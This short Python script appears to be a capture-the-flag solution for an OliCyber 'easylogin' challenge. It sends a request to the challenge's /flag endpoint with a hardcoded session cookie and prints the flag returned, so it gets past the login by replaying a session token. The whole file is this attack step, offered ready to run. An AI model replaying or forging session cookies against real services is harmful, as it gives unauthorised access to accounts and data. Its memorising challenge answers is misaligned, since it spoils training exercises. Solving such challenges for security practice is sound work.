import requests

response = requests.get("http://easylogin.challs.territoriale.olicyber.it/flag", cookies={"session":"d6f816cd031715f733539affe057b5103530c23ff9aa01c5c4e71990ac2ae2ac"})

print(response.text)